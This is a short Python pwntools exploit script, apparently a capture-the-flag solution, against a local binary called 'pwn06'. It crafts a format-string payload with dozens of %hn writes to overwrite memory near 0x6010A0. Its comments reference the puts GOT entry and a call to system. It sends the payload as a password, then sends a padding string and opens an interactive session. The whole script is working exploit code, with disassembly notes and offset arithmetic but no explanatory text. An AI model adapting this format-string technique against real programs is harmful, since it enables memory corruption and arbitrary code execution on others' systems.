from pwn import *
p = process('./pwn06')
elf = ELF('./pwn06')

gdb.attach(p)

AZ = 0x6010A0					# p &AZaz09
puts_got = 0x601018				# x/3i 0x4006c0
systemTEXT = 0x400975			

'''
   0x0000000000400970 <+281>:	call   0x4006c0 <puts@plt>
   0x0000000000400975 <+286>:	lea    rdi,[rip+0x129]        # 0x400aa5
   0x000000000040097c <+293>:	call   0x400700 <system@plt>
   0x0000000000400981 <+298>:	jmp    0x4009af <main+344>
'''

# 0x0975 = 2421
# 0x10040 - 0x0975 - 4 = 63175
# 0x20000 - 0x10043 = 65469

# parameter 10


payload = "%16705c%35$hn%36$hn%37$hn%38$hn%39$hn%40$hn%41$hn%42$hn%43$hn%44$hn%45$hn%46$hn%47$hn%48$hn%49$hn%50$hn%51$hn%52$hn%53$hn%54$hn%55$hn%56$hn%57$hn%58$hn%59$hn%60$hn%61$hn%62$hn%63$hn%64$hn%65$hn-------"
payload += p64(AZ)
payload += p64(AZ + 2)
payload += p64(AZ + 4)
payload += p64(AZ + 6)
payload += p64(AZ + 8)
payload += p64(AZ + 10)
payload += p64(AZ + 12)
payload += p64(AZ + 14)
payload += p64(AZ + 16)
payload += p64(AZ + 18)
payload += p64(AZ + 20)
payload += p64(AZ + 22)
payload += p64(AZ + 24)
payload += p64(AZ + 26)
payload += p64(AZ + 28) 
payload += p64(AZ + 30)
payload += p64(AZ + 32)
payload += p64(AZ + 34)
payload += p64(AZ + 36)
payload += p64(AZ + 38)
payload += p64(AZ + 40)
payload += p64(AZ + 42)
payload += p64(AZ + 44)
payload += p64(AZ + 46) 
payload += p64(AZ + 48)
payload += p64(AZ + 50)
payload += p64(AZ + 52)
payload += p64(AZ + 54)
payload += p64(AZ + 56)
payload += p64(AZ + 58)
payload += p64(AZ + 60)

p.recvuntil("Enter password ...")
p.sendline(payload)
a = "A" * 256
# p.sendline(a)

p.recvuntil("incorrect password")
p.sendline(a)

p.interactive() 


